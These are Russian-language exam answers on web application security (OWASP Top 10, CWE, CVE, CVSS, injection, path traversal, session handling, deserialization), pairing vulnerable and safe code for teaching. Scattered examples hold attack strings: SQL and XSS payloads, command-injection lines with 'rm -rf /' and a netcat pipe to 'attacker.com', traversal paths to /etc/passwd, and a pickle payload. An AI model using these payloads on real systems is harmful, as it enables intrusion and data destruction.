# Ответы на вопросы к зачёту
## Раздел 6: Угрозы, уязвимости и классификации

### 126. К какой категории OWASP Top 10 (2021) относится SQL-инъекция?

**Ответ:** SQL-инъекция относится к категории **A03:2021 – Injection (Инъекции)** в OWASP Top 10 (2021).

**Описание категории:**
Категория Injection включает все виды инъекций, когда злоумышленник может вставить вредоносные данные, которые интерпретируются как команды или запросы системой:
- SQL Injection (SQLi)
- NoSQL Injection
- Command Injection
- LDAP Injection
- XPath Injection
- OS Command Injection

**Особенности SQL-инъекции:**
- Наиболее распространённый тип инъекций
- Позволяет выполнять произвольные SQL-запросы
- Может привести к чтению, изменению, удалению данных
- Может привести к компрометации всей базы данных

**Примеры:**
```sql
-- Классическая SQL-инъекция
SELECT * FROM users WHERE id = '1' OR '1'='1' --'

-- Union-based injection
SELECT * FROM users WHERE id = '1' UNION SELECT password FROM admin_users --'

-- Time-based blind injection
SELECT * FROM users WHERE id = '1'; WAITFOR DELAY '00:00:05' --'
```

---

### 127. К какой категории OWASP Top 10 (2021) относится XSS?

**Ответ:** XSS (Cross-Site Scripting) относится к категории **A03:2021 – Injection (Инъекции)** в OWASP Top 10 (2021).

**Примечание:** В более ранних версиях OWASP Top 10 XSS имел отдельную категорию, но в версии 2021 он объединён с другими типами инъекций в общую категорию Injection.

**Типы XSS:**
1. **Reflected XSS (Отражённый XSS):**
   - Сценарий отражается от сервера в ответе
   - Данные из запроса попадают в ответ без фильтрации

2. **Stored XSS (Постоянный XSS):**
   - Сценарий сохраняется на сервере (в БД)
   - Выполняется при каждом просмотре страницы

3. **DOM-based XSS:**
   - Сценарий выполняется на клиенте через манипуляции с DOM
   - Не требует отправки данных на сервер

**Примеры:**
```html
<!-- Reflected XSS -->
<script>alert('XSS')</script>

<!-- Stored XSS в комментарии -->
<img src="x" onerror="alert(document.cookie)">

<!-- DOM-based XSS -->
<script>document.write(location.hash)</script>
```

---

### 128. К какой категории OWASP Top 10 (2021) относится Broken Access Control?

**Ответ:** Broken Access Control относится к категории **A01:2021 – Broken Access Control (Нарушение контроля доступа)** — это первая и наиболее критичная категория в OWASP Top 10 (2021).

**Описание:**
Нарушение контроля доступа происходит, когда приложение не должным образом ограничивает доступ пользователей к ресурсам и функциям, к которым они не должны иметь доступа.

**Типичные проявления:**

1. **Horizontal Privilege Escalation (Горизонтальное повышение привилегий):**
   - Доступ к данным других пользователей того же уровня
   - Пример: `/api/users/123` вместо `/api/users/456`

2. **Vertical Privilege Escalation (Вертикальное повышение привилегий):**
   - Обычный пользователь получает права администратора
   - Пример: доступ к `/admin/delete-user` без прав администратора

3. **IDOR (Insecure Direct Object Reference):**
   - Прямая ссылка на объект без проверки прав
   - Пример: `/api/documents/123` без проверки, что документ принадлежит пользователю

4. **Missing Authorization (Отсутствие авторизации):**
   - Функции доступны без проверки прав
   - Пример: API-эндпоинт без проверки токена

**Примеры уязвимостей:**
```python
# УЯЗВИМО: Нет проверки прав
@app.route('/api/users/<user_id>')
def get_user(user_id):
    return User.query.get(user_id)

# БЕЗОПАСНО: Проверка прав
@app.route('/api/users/<user_id>')
@require_auth
def get_user(user_id):
    if current_user.id != int(user_id) and not current_user.is_admin:
        abort(403)
    return User.query.get(user_id)
```

**Статистика:**
- Занимает первое место в OWASP Top 10 (2021)
- Встречается в 94% протестированных приложений
- Средний взвешенный показатель влияния: 7.0/10

---

### 129. Что такое CWE?

**Ответ:** **CWE (Common Weakness Enumeration)** — это общий перечисленный список типов уязвимостей и ошибок программного обеспечения, разработанный сообществом MITRE Corporation.

**Определение:**
CWE — это категоризированный список типов слабостей в программном обеспечении, который обеспечивает:
- Общий язык для описания уязвимостей
- Базовую основу для выявления и исправления уязвимостей
- Меры для предотвращения уязвимостей

**Основные характеристики:**

1. **Структурированный список:**
   - Более 900 типов слабостей (CWE IDs)
   - Иерархическая структура
   - Связи между различными типами

2. **Описание слабостей:**
   - Определение слабости
   - Примеры уязвимого кода
   - Возможные последствия
   - Методы обнаружения
   - Рекомендации по исправлению

3. **Категоризация:**
   - По типу: Injection, Buffer Overflow, XSS и т.д.
   - По фазе разработки: Design, Implementation
   - По технологиям: Web, Desktop, Mobile

**Примеры CWE:**
- **CWE-79** — Cross-site Scripting (XSS)
- **CWE-89** — SQL Injection
- **CWE-78** — OS Command Injection
- **CWE-22** — Path Traversal
- **CWE-120** — Buffer Copy without Checking Size of Input

**Использование:**
- Инструменты статического анализа ссылаются на CWE
- Отчёты о безопасности содержат CWE IDs
- База знаний для разработчиков
- Стандартизация описания уязвимостей

**CWE Top 25:**
Ежегодно публикуется список 25 наиболее опасных слабостей программного обеспечения на основе их частоты и серьёзности.

---

### 130. Что такое CVE?

**Ответ:** **CVE (Common Vulnerabilities and Exposures)** — это каталог известных уязвимостей в безопасности программного обеспечения и аппаратного обеспечения, каждая из которых имеет уникальный идентификатор.

**Определение:**
CVE — это база данных, содержащая информацию о конкретных уязвимостях безопасности, обнаруженных в программных и аппаратных продуктах.

**Основные характеристики:**

1. **Уникальный идентификатор:**
   - Формат: `CVE-YYYY-NNNNN`
   - Год обнаружения + порядковый номер
   - Пример: `CVE-2021-44228` (Log4j vulnerability)

2. **Стандартизированное описание:**
   - Краткое описание уязвимости
   - Ссылки на дополнительные ресурсы
   - Информация о затронутых версиях

3. **Публичная доступность:**
   - Бесплатный доступ к базе данных
   - Поиск по продуктам и версиям
   - Интеграция с системами управления уязвимостями

**Пример CVE:**
```
CVE-2021-44228
Title: Apache Log4j2 JNDI features do not protect against attacker controlled LDAP and other JNDI related endpoints
Description: Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints.
CVSS Score: 10.0 (Critical)
```

**Источники CVE:**
- MITRE Corporation (главный куратор)
- CNAs (CVE Numbering Authorities) — организации, уполномоченные присваивать CVE
- Производители ПО
- Исследователи безопасности

**Использование:**
- Отслеживание известных уязвимостей в зависимостях
- Сканирование уязвимостей
- Управление патчами
- Соответствие требованиям безопасности

**Связь CVE и CWE:**
- CVE описывает конкретную уязвимость (например, CVE-2021-44228)
- CWE описывает тип слабости (например, CWE-502 — Deserialization of Untrusted Data)
- Один CVE может быть связан с одним или несколькими CWE

---

### 131. Что такое CVSS и для чего он применяется?

**Ответ:** **CVSS (Common Vulnerability Scoring System)** — это открытый стандарт для оценки и характеристики серьёзности уязвимостей безопасности в программном обеспечении.

**Определение:**
CVSS предоставляет числовую оценку (score) от 0.0 до 10.0, которая отражает серьёзность уязвимости, помогая организациям приоритизировать устранение уязвимостей.

**Версии CVSS:**
- **CVSS v2.0** — устаревшая версия
- **CVSS v3.0** — предыдущая версия
- **CVSS v3.1** — текущая версия (по состоянию на 2021)
- **CVSS v4.0** — разрабатываемая версия

**Метрики CVSS v3.1:**

**Base Score Metrics (Базовые метрики):**

1. **Attack Vector (AV):**
   - Network (N) — через сеть
   - Adjacent (A) — локальная сеть
   - Local (L) — локальный доступ
   - Physical (P) — физический доступ

2. **Attack Complexity (AC):**
   - Low (L) — низкая сложность
   - High (H) — высокая сложность

3. **Privileges Required (PR):**
   - None (N) — не требуются
   - Low (L) — низкие привилегии
   - High (H) — высокие привилегии

4. **User Interaction (UI):**
   - None (N) — не требуется
   - Required (R) — требуется

5. **Scope (S):**
   - Unchanged (U) — не изменяется
   - Changed (C) — изменяется

6. **Confidentiality (C):**
   - None (N) — нет утечки
   - Low (L) — частичная утечка
   - High (H) — полная утечка

7. **Integrity (I):**
   - None (N) — нет изменения
   - Low (L) — частичное изменение
   - High (H) — полное изменение

8. **Availability (A):**
   - None (N) — нет влияния
   - Low (L) — частичное влияние
   - High (H) — полное влияние

**Уровни серьёзности:**
- **0.0** — None (Нет)
- **0.1-3.9** — Low (Низкая)
- **4.0-6.9** — Medium (Средняя)
- **7.0-8.9** — High (Высокая)
- **9.0-10.0** — Critical (Критическая)

**Пример:**
```
CVE-2021-44228 (Log4j)
CVSS v3.1: 10.0 (Critical)
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
```

**Для чего применяется:**

1. **Приоритизация исправлений:**
   - Фокус на уязвимостях с высоким CVSS
   - Планирование ресурсов на исправление

2. **Управление рисками:**
   - Оценка рисков безопасности
   - Принятие решений о развёртывании

3. **Соответствие требованиям:**
   - Требования к устранению уязвимостей с CVSS > 7.0
   - Отчёты для аудита

4. **Коммуникация:**
   - Объяснение серьёзности уязвимостей
   - Информирование заинтересованных сторон

**Типы CVSS scores:**
- **Base Score** — базовый рейтинг, не меняется со временем
- **Temporal Score** — с учётом временных факторов (доступность патча, подтверждение уязвимости)
- **Environmental Score** — с учётом конкретной среды организации

---

### 132. Какие уязвимости относятся к реализации, а не к проектированию?

**Ответ:** Уязвимости, связанные с **реализацией (Implementation)** возникают из-за ошибок в коде при реализации, в то время как уязвимости проектирования связаны с архитектурными решениями.

**Уязвимости реализации:**

1. **SQL Injection (CWE-89):**
   - Неправильное использование параметризованных запросов
   - Прямая конкатенация пользовательского ввода в SQL

2. **Buffer Overflow (CWE-120, CWE-121):**
   - Использование небезопасных функций (strcpy, gets)
   - Отсутствие проверки размера буфера

3. **XSS (CWE-79):**
   - Отсутствие экранирования при выводе пользовательского ввода
   - Неправильное использование innerHTML вместо textContent

4. **Path Traversal (CWE-22):**
   - Отсутствие валидации путей к файлам
   - Использование пользовательского ввода без санитизации

5. **Command Injection (CWE-78):**
   - Использование os.system() с пользовательским вводом
   - Неправильное использование subprocess

6. **Improper Input Validation (CWE-20):**
   - Отсутствие валидации входных данных
   - Некорректная валидация

7. **Use After Free (CWE-416):**
   - Использование освобождённой памяти
   - Ошибки управления памятью

8. **Race Condition (CWE-362):**
   - Отсутствие синхронизации между потоками
   - Time-of-check-time-of-use (TOCTOU)

9. **Hardcoded Credentials (CWE-798):**
   - Хардкод паролей в коде
   - Хранение секретов в конфигурационных файлах

10. **Insecure Randomness (CWE-330):**
    - Использование предсказуемых генераторов случайных чисел
    - Неправильная инициализация генератора

**Отличия от уязвимостей проектирования:**

**Уязвимости проектирования:**
- Плохая архитектура безопасности
- Отсутствие механизмов аутентификации
- Неправильная модель контроля доступа
- Отсутствие шифрования на уровне архитектуры

**Уязвимости реализации:**
- Ошибки в коде
- Неправильное использование API
- Отсутствие проверок в коде
- Неправильная обработка ошибок

**Пример:**
```python
# УЯЗВИМОСТЬ РЕАЛИЗАЦИИ: Неправильное использование API
query = "SELECT * FROM users WHERE id = " + user_id  # SQL Injection

# БЕЗОПАСНАЯ РЕАЛИЗАЦИЯ
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
```

---

### 133. Какие уязвимости характерны для веб-приложений?

**Ответ:** Следующие уязвимости характерны для веб-приложений:

**1. Injection уязвимости:**
- **SQL Injection** — инъекция SQL-запросов
- **NoSQL Injection** — инъекция в NoSQL базы
- **Command Injection** — выполнение системных команд
- **LDAP Injection** — инъекция LDAP-запросов
- **XPath Injection** — инъекция XPath

**2. Cross-Site Scripting (XSS):**
- **Reflected XSS** — отражённый XSS
- **Stored XSS** — постоянный XSS
- **DOM-based XSS** — XSS через DOM

**3. Broken Access Control:**
- **IDOR** — Insecure Direct Object Reference
- **Privilege Escalation** — повышение привилегий
- **Missing Authorization** — отсутствие проверки прав

**4. Security Misconfiguration:**
- Открытые отладочные интерфейсы
- Небезопасная конфигурация сервера
- Раскрытие информации в заголовках

**5. Broken Authentication:**
- Слабая проверка паролей
- Небезопасное управление сессиями
- Утечка учётных данных

**6. Sensitive Data Exposure:**
- Нешифрованные данные
- Слабые алгоритмы шифрования
- Хранение паролей в открытом виде

**7. XXE (XML External Entity):**
- Внешние сущности в XML
- Чтение локальных файлов
- SSRF через XXE

**8. SSRF (Server-Side Request Forgery):**
- Подделка запросов сервера
- Доступ к внутренним ресурсам

**9. Insecure Deserialization:**
- Десериализация небезопасных данных
- Выполнение произвольного кода

**10. Insufficient Logging & Monitoring:**
    - Отсутствие логирования
    - Недостаточный мониторинг

**11. CORS Misconfiguration:**
    - Неправильная настройка CORS
    - Доступ к API с любых доменов

**12. Open Redirect:**
    - Редиректы на произвольные URL
    - Фишинг через редиректы

**13. CSRF (Cross-Site Request Forgery):**
    - Подделка запросов от имени пользователя
    - Выполнение действий без ведома пользователя

**14. Clickjacking:**
    - Наложение элементов на страницу
    - Обман пользователя для выполнения действий

**15. Session Management Issues:**
    - Небезопасные идентификаторы сессий
    - Неправильное время жизни сессии
    - Session Fixation

---

### 134. Какие уязвимости связаны с управлением сессиями?

**Ответ:** Уязвимости, связанные с управлением сессиями:

**1. Session Fixation (CWE-384):**
- Фиксация идентификатора сессии злоумышленником
- Принуждение пользователя использовать известный session ID
- Атака: злоумышленник получает session ID, заставляет пользователя войти, получает доступ

**2. Weak Session ID (CWE-330):**
- Предсказуемые идентификаторы сессий
- Последовательные или основанные на времени ID
- Легко угадываемые session tokens

**3. Session Hijacking:**
- Перехват идентификатора сессии
- Использование перехваченного session ID
- Атаки через XSS, network sniffing

**4. Long Session Timeout:**
- Слишком долгое время жизни сессии
- Сессии не истекают при бездействии
- Риск использования украденной сессии

**5. Session Not Invalidated on Logout:**
- Сессия не удаляется при выходе
- Session ID остаётся валидным после logout
- Возможность повторного использования

**6. Concurrent Session Control:**
- Отсутствие контроля одновременных сессий
- Пользователь может иметь множество активных сессий
- Невозможность отозвать все сессии

**7. Missing HttpOnly Flag:**
- Cookies доступны через JavaScript
- Возможность украсть через XSS
- Отсутствие защиты от XSS-атак

**8. Missing Secure Flag:**
- Cookies передаются по HTTP
- Возможность перехвата через сеть
- Отсутствие обязательного HTTPS

**9. SameSite Cookie Not Set:**
- Cookies отправляются в cross-site запросах
- Уязвимость к CSRF-атакам
- Отсутствие защиты от подделки запросов

**10. Session Storage in URL:**
    - Session ID в URL (GET параметры)
    - Утечка через логи, referrer
    - Видимость в истории браузера

**11. Session Replay:**
    - Отсутствие защиты от повторного использования токенов
    - Возможность повторной отправки запросов
    - Отсутствие nonce или timestamps

**12. Missing Session Regeneration:**
    - Session ID не меняется после аутентификации
    - Использование одного ID на протяжении сессии
    - Риск session fixation

**Примеры:**

```python
# УЯЗВИМО: Предсказуемый session ID
session_id = str(user_id) + str(time.time())  # Предсказуемо

# БЕЗОПАСНО: Случайный session ID
import secrets
session_id = secrets.token_urlsafe(32)

# УЯЗВИМО: Session не удаляется при logout
def logout():
    # Только очистка на клиенте
    response.delete_cookie('session_id')

# БЕЗОПАСНО: Удаление сессии на сервере
def logout():
    session_storage.delete(session_id)
    response.delete_cookie('session_id')

# УЯЗВИМО: Cookie без HttpOnly и Secure
response.set_cookie('session_id', session_id)

# БЕЗОПАСНО: Cookie с флагами
response.set_cookie(
    'session_id',
    session_id,
    httponly=True,
    secure=True,
    samesite='Strict'
)
```

---

### 135. Какие уязвимости могут возникнуть при неправильной обработке файлов?

**Ответ:** Уязвимости при неправильной обработке файлов:

**1. Path Traversal (Directory Traversal, CWE-22):**
- Обход ограничений доступа к файлам
- Доступ к файлам вне разрешённой директории
- Использование `../` для поднятия по директориям

**2. Unrestricted File Upload (CWE-434):**
- Загрузка произвольных файлов
- Загрузка исполняемых файлов
- Загрузка скриптов (PHP, JSP, ASP)

**3. Insecure File Permissions:**
- Файлы доступны всем пользователям
- Исполняемые файлы с неправильными правами
- Отсутствие контроля доступа к файлам

**4. File Inclusion (LFI/RFI):**
- **Local File Inclusion (LFI)** — включение локальных файлов
- **Remote File Inclusion (RFI)** — включение удалённых файлов
- Выполнение произвольного кода

**5. Zip Slip (CWE-29):**
- Path traversal при распаковке архивов
- Запись файлов вне целевой директории
- Использование путей с `../` в именах файлов

**6. Race Condition (TOCTOU):**
- Time-of-check-time-of-use
- Изменение файла между проверкой и использованием
- Символические ссылки (symlink attacks)

**7. Insecure Temporary Files:**
- Временные файлы с предсказуемыми именами
- Файлы доступны другим пользователям
- Отсутствие безопасного создания временных файлов

**8. Information Disclosure:**
- Раскрытие чувствительной информации через файлы
- Backup файлы доступны (.bak, .old, ~)
- Раскрытие путей, версий, конфигурации

**9. File Type Confusion:**
- Проверка типа файла только по расширению
- Отсутствие проверки magic bytes
- Загрузка опасных файлов с безопасным расширением

**10. Unsafe File Operations:**
    - Использование небезопасных функций
    - Отсутствие валидации имён файлов
    - Некорректная обработка специальных символов

**Примеры:**

```python
# УЯЗВИМО: Path Traversal
filename = request.args.get('file')
with open(filename, 'r') as f:  # Может открыть /etc/passwd
    content = f.read()

# БЕЗОПАСНО: Валидация пути
from pathlib import Path
BASE_DIR = Path("/var/www/uploads")
filepath = BASE_DIR / filename
if not filepath.resolve().is_relative_to(BASE_DIR.resolve()):
    raise ValueError("Invalid path")
with open(filepath, 'r') as f:
    content = f.read()

# УЯЗВИМО: Проверка только расширения
if filename.endswith('.jpg'):
    save_file(file)  # Может быть PHP скрипт с расширением .jpg

# БЕЗОПАСНО: Проверка magic bytes
import magic
mime_type = magic.from_buffer(file.read(), mime=True)
if mime_type != 'image/jpeg':
    raise ValueError("Invalid file type")
```

---

### 136. Какие уязвимости связаны с неправильным управлением зависимостями?

**Ответ:** Уязвимости, связанные с управлением зависимостями:

**1. Using Components with Known Vulnerabilities (CWE-1104):**
- Использование библиотек с известными уязвимостями
- Отсутствие обновлений зависимостей
- Использование устаревших версий

**2. Insecure Dependency Management:**
- Отсутствие фиксации версий
- Использование `latest` в зависимостях
- Отсутствие проверки целостности

**3. Supply Chain Attacks:**
- Компрометация зависимостей в процессе поставки
- Typosquatting (поддельные пакеты с похожими именами)
- Compromised packages в репозиториях

**4. Dependency Confusion:**
- Подмена внутренних пакетов публичными
- Загрузка вредоносных пакетов вместо внутренних
- Отсутствие приоритета внутренних репозиториев

**5. Unverified Dependencies:**
- Использование зависимостей без проверки
- Отсутствие сканирования на уязвимости
- Загрузка из ненадёжных источников

**6. License Violations:**
- Использование несовместимых лицензий
- Отсутствие проверки лицензий
- Нарушение требований лицензий

**7. Outdated Dependencies:**
- Использование устаревших версий
- Отсутствие обновлений безопасности
- Накопление технического долга

**8. Over-privileged Dependencies:**
- Зависимости с избыточными правами
- Выполнение зависимостей с высокими привилегиями
- Отсутствие принципа наименьших привилегий

**Примеры:**

```python
# УЯЗВИМО: Нефиксированные версии
# requirements.txt
requests  # Может обновиться до уязвимой версии

# БЕЗОПАСНО: Фиксированные версии
requests==2.28.2  # Конкретная версия

# УЯЗВИМО: Использование уязвимой библиотеки
# Известная уязвимость в log4j 2.0-2.14.1
# CVE-2021-44228 (Log4Shell)

# БЕЗОПАСНО: Обновление до безопасной версии
log4j-core==2.17.1  # Исправленная версия

# УЯЗВИМО: Загрузка из ненадёжного источника
pip install --index-url http://untrusted-repo.com/simple package

# БЕЗОПАСНО: Использование доверенных репозиториев
pip install --index-url https://pypi.org/simple package
```

**Меры защиты:**
- Регулярное сканирование зависимостей (SCA)
- Использование SBOM (Software Bill of Materials)
- Автоматическое обновление зависимостей
- Проверка цифровых подписей
- Использование lock-файлов

---

### 137. Что такое Open Redirect и к какому классу ошибок он относится?

**Ответ:** **Open Redirect (Открытое перенаправление)** — это уязвимость, при которой веб-приложение перенаправляет пользователя на URL, указанный в параметрах запроса, без проверки принадлежности URL к доверенному домену.

**Класс ошибок:**
Open Redirect относится к категории **A01:2021 – Broken Access Control** в OWASP Top 10 (2021), хотя в более ранних версиях мог быть частью категории **Unvalidated Redirects and Forwards**.

**CWE классификация:**
- **CWE-601** — URL Redirection to Untrusted Site ('Open Redirect')

**Как работает:**

1. **Пользователь переходит по ссылке:**
   ```
   https://example.com/redirect?url=http://evil.com/phishing
   ```

2. **Приложение выполняет редирект:**
   ```php
   header("Location: " . $_GET['url']);
   ```

3. **Пользователь перенаправляется на злонамеренный сайт**

**Угрозы:**

1. **Фишинг:**
   - Обман пользователей через поддельные сайты
   - Кражу учётных данных
   - Создание доверия к вредоносным ссылкам

2. **Обход фильтров:**
   - Обход URL-фильтров безопасности
   - Обход blacklist фильтров

3. **Утечка токенов:**
   - Токены в Referer заголовке
   - Утечка через query параметры

**Примеры уязвимого кода:**

```php
// PHP - УЯЗВИМО
header("Location: " . $_GET['url']);

// Python Flask - УЯЗВИМО
return redirect(request.args.get('url'))

// JavaScript - УЯЗВИМО
window.location.href = new URLSearchParams(location.search).get('url');
```

**Безопасная реализация:**

```php
// PHP - БЕЗОПАСНО
$allowed_domains = ['example.com', 'trusted-partner.com'];
$url = $_GET['url'];
$parsed = parse_url($url);

if (!in_array($parsed['host'], $allowed_domains)) {
    die("Domain not allowed");
}

header("Location: " . $url);
```

```python
# Python - БЕЗОПАСНО
ALLOWED_DOMAINS = ['example.com', 'trusted-partner.com']

def safe_redirect(url):
    parsed = urlparse(url)
    if parsed.netloc not in ALLOWED_DOMAINS:
        abort(400)
    return redirect(url)
```

**Меры защиты:**
- Whitelist разрешённых доменов
- Использование ID вместо URL для редиректов
- Относительные пути для внутренних редиректов
- Валидация и проверка всех URL перед редиректом

---

### 138. Что такое Command Injection и как её предотвратить?

**Ответ:** **Command Injection (CWE-78)** — это уязвимость, при которой злоумышленник может выполнить произвольные команды операционной системы на сервере через приложение.

**Как работает:**

Приложение использует пользовательский ввод для построения системных команд, которые выполняются на сервере. Злоумышленник может вставить дополнительные команды, которые также будут выполнены.

**Примеры уязвимого кода:**

```python
# УЯЗВИМО: Python
import os
filename = request.args.get('file')
os.system(f"cat {filename}")  # Команда: cat file.txt; rm -rf /

# УЯЗВИМО: PHP
$filename = $_GET['file'];
exec("ls " . $filename);  // Команда: ls file; rm -rf /
```

**Примеры атак:**

```bash
# Атака через разделитель команд
file.txt; rm -rf /

# Атака через &&
file.txt && cat /etc/passwd

# Атака через |
file.txt | nc attacker.com 4444

# Атака через backtick
file.txt `whoami`
```

**Как предотвратить:**

**1. Избегать выполнения команд:**
```python
# Вместо os.system() использовать безопасные альтернативы
import shutil
shutil.copy(src, dst)  # Вместо subprocess.run(['cp', src, dst])
```

**2. Использовать subprocess с параметрами:**
```python
# БЕЗОПАСНО: Передача аргументов списком
import subprocess
subprocess.run(['ls', '-l', filename])  # Безопасно

# ОПАСНО: Использование shell=True
subprocess.run(f"ls {filename}", shell=True)  # Уязвимо!
```

**3. Валидация и санитизация:**
```python
import re
import shlex

def safe_execute(filename):
    # Валидация: только безопасные символы
    if not re.match(r'^[a-zA-Z0-9._-]+$', filename):
        raise ValueError("Invalid filename")
    
    # Экранирование через shlex
    safe_filename = shlex.quote(filename)
    subprocess.run(['cat', safe_filename])
```

**4. Whitelist разрешённых команд:**
```python
ALLOWED_COMMANDS = {
    'list': ['ls', '-l'],
    'count': ['wc', '-l']
}

def execute_command(command_name, *args):
    if command_name not in ALLOWED_COMMANDS:
        raise ValueError("Command not allowed")
    
    cmd = ALLOWED_COMMANDS[command_name].copy()
    cmd.extend(args)
    subprocess.run(cmd)
```

**5. Использование библиотек вместо команд:**
```python
# Вместо выполнения команды используйте библиотеки
import os
os.listdir('/path')  # Вместо subprocess.run(['ls', '/path'])
```

**6. Ограничение прав:**
```python
# Выполнение с ограниченными правами
subprocess.run(
    cmd,
    user='limited_user',  # Ограниченный пользователь
    timeout=5  # Таймаут
)
```

**Дополнительные меры:**
- Принцип наименьших привилегий
- Изоляция выполнения (chroot, containers)
- Логирование всех выполненных команд
- Статический анализ для поиска опасных функций

---

### 139. Что такое Path Traversal и как её обнаружить?

**Ответ:** **Path Traversal (Directory Traversal, CWE-22)** — это уязвимость, позволяющая злоумышленнику получить доступ к файлам и директориям, находящимся вне корневой директории веб-приложения.

**Как работает:**

Используя специальные последовательности (`../`, `..\\`) в путях к файлам, злоумышленник может подняться по директориям и получить доступ к произвольным файлам.

**Примеры атак:**

```
# Unix/Linux
../../../etc/passwd
....//....//etc/passwd
%2e%2e%2f%2e%2e%2fetc%2fpasswd  (URL-encoded)

# Windows
..\..\..\windows\system32\config\sam
....\\....\\windows\\system32\\config\\sam
```

**Уязвимый код:**

```python
# УЯЗВИМО
filename = request.args.get('file')
with open(f"/var/www/uploads/{filename}", 'r') as f:
    content = f.read()

# Атака: ?file=../../../etc/passwd
# Результат: открыт /etc/passwd
```

**Как обнаружить:**

**1. Статический анализ (SAST):**
- Поиск функций работы с файлами
- Поиск использования пользовательского ввода в путях
- Обнаружение отсутствия валидации путей

**2. Динамический анализ (DAST):**
- Тестирование с path traversal последовательностями
- Проверка доступа к системным файлам
- Использование сканеров уязвимостей

**3. Ручное тестирование:**
```bash
# Тестовые запросы
curl "http://example.com/download?file=../../../etc/passwd"
curl "http://example.com/download?file=....//....//etc/passwd"
curl "http://example.com/download?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd"
```

**4. Автоматизированное сканирование:**
- Burp Suite
- OWASP ZAP
- SQLMap (для файловых операций в SQL)

**Защита:**

```python
from pathlib import Path

def safe_read_file(filename):
    # Базовая директория
    BASE_DIR = Path("/var/www/uploads").resolve()
    
    # Построение пути
    filepath = (BASE_DIR / filename).resolve()
    
    # Проверка, что путь внутри BASE_DIR
    try:
        filepath.relative_to(BASE_DIR)
    except ValueError:
        raise ValueError("Path traversal detected")
    
    # Дополнительная проверка
    if '..' in str(filepath):
        raise ValueError("Invalid path")
    
    with open(filepath, 'r') as f:
        return f.read()
```

**Признаки уязвимости:**
- Использование пользовательского ввода в путях
- Отсутствие нормализации путей
- Отсутствие проверки на `..`
- Использование небезопасных функций (file_get_contents, fopen)

---

### 140. Что такое CWE-89?

**Ответ:** **CWE-89** — это **SQL Injection** (SQL-инъекция) в классификации Common Weakness Enumeration.

**Описание:**
CWE-89 представляет собой слабость в программном обеспечении, при которой приложение генерирует SQL-запросы, используя пользовательский ввод без надлежащей валидации или экранирования, что позволяет злоумышленнику изменять логику запроса и выполнять произвольные SQL-команды.

**Характеристики:**
- **Категория:** Injection
- **Вероятность эксплуатации:** Высокая
- **Воздействие:** Критическое
- **Технологии:** Веб-приложения, базы данных

**Примеры:**

```python
# УЯЗВИМЫЙ КОД
user_id = request.args.get('id')
query = f"SELECT * FROM users WHERE id = {user_id}"
cursor.execute(query)

# Атака: ?id=1 OR 1=1 --
# Результирующий запрос: SELECT * FROM users WHERE id = 1 OR 1=1 --
```

**Последствия:**
- Чтение данных из базы данных
- Изменение или удаление данных
- Обход аутентификации
- Выполнение административных операций

**Меры защиты:**
- Использование параметризованных запросов
- ORM (Object-Relational Mapping)
- Валидация входных данных
- Принцип наименьших привилегий для БД

**Статистика:**
- Входит в CWE Top 25
- Очень распространённая уязвимость
- Высокая критичность

---

### 141. Что такое CWE-78?

**Ответ:** **CWE-78** — это **OS Command Injection** (Инъекция команд операционной системы) в классификации Common Weakness Enumeration.

**Описание:**
CWE-78 представляет собой слабость, при которой приложение включает пользовательский ввод в системную команду операционной системы без надлежащей валидации или экранирования, что позволяет злоумышленнику выполнить произвольные команды на сервере.

**Характеристики:**
- **Категория:** Injection
- **Вероятность эксплуатации:** Средняя-Высокая
- **Воздействие:** Высокое-Критическое
- **Технологии:** Все языки программирования

**Примеры:**

```python
# УЯЗВИМЫЙ КОД
import os
filename = request.args.get('file')
os.system(f"cat {filename}")

# Атака: ?file=/etc/passwd; rm -rf /
# Выполнится: cat /etc/passwd; rm -rf /
```

**Последствия:**
- Выполнение произвольных команд на сервере
- Компрометация сервера
- Доступ к файловой системе
- Запуск вредоносного кода

**Меры защиты:**
- Использование API вместо команд
- Валидация и санитизация входных данных
- Использование subprocess с параметрами (без shell)
- Whitelist разрешённых команд

---

### 142. Что такое CWE-22?

**Ответ:** **CWE-22** — это **Path Traversal** (Обход пути, Directory Traversal) в классификации Common Weakness Enumeration.

**Описание:**
CWE-22 представляет собой слабость, при которой приложение использует внешний ввод для построения пути к файлу или директории без ограничений, что позволяет злоумышленнику получить доступ к файлам и директориям вне предполагаемой ограниченной директории.

**Характеристики:**
- **Категория:** Input Validation
- **Вероятность эксплуатации:** Средняя
- **Воздействие:** Среднее-Высокое
- **Технологии:** Веб-приложения, файловые системы

**Примеры:**

```python
# УЯЗВИМЫЙ КОД
filename = request.args.get('file')
with open(f"/var/www/uploads/{filename}", 'r') as f:
    content = f.read()

# Атака: ?file=../../../etc/passwd
# Результат: открыт /etc/passwd
```

**Последствия:**
- Чтение произвольных файлов
- Доступ к системным файлам
- Утечка конфиденциальной информации
- Раскрытие исходного кода

**Меры защиты:**
- Валидация и нормализация путей
- Использование базовой директории
- Проверка относительных путей
- Whitelist разрешённых файлов

---

### 143. Какие уязвимости относятся к insecure deserialization?

**Ответ:** Уязвимости, связанные с **insecure deserialization** (небезопасной десериализацией):

**1. Deserialization of Untrusted Data (CWE-502):**
- Десериализация данных от ненадёжных источников
- Выполнение произвольного кода при десериализации
- Изменение логики приложения

**2. Unsafe Deserialization:**
- Десериализация без валидации
- Отсутствие контроля над десериализуемыми объектами
- Использование небезопасных форматов (pickle, YAML)

**3. Object Injection:**
- Инъекция произвольных объектов
- Изменение поведения приложения
- Обход механизмов безопасности

**4. Remote Code Execution через десериализацию:**
- Выполнение кода при десериализации
- Загрузка произвольных классов
- Вызов опасных методов

**Примеры:**

```python
# УЯЗВИМО: Python pickle
import pickle
data = request.data
obj = pickle.loads(data)  # Может выполнить произвольный код!

# Пример вредоносного объекта
class Malicious:
    def __reduce__(self):
        return (os.system, ('rm -rf /',))

# БЕЗОПАСНО: Использование JSON
import json
obj = json.loads(data)  # Безопасно, не выполняет код
```

```python
# УЯЗВИМО: PHP unserialize
$data = $_POST['data'];
$obj = unserialize($data);  # Может выполнить произвольный код

# БЕЗОПАСНО: JSON
$obj = json_decode($_POST['data'], true);
```

**Последствия:**
- Выполнение произвольного кода (RCE)
- Обход аутентификации
- Изменение данных приложения
- DoS через потребление ресурсов

**Меры защиты:**
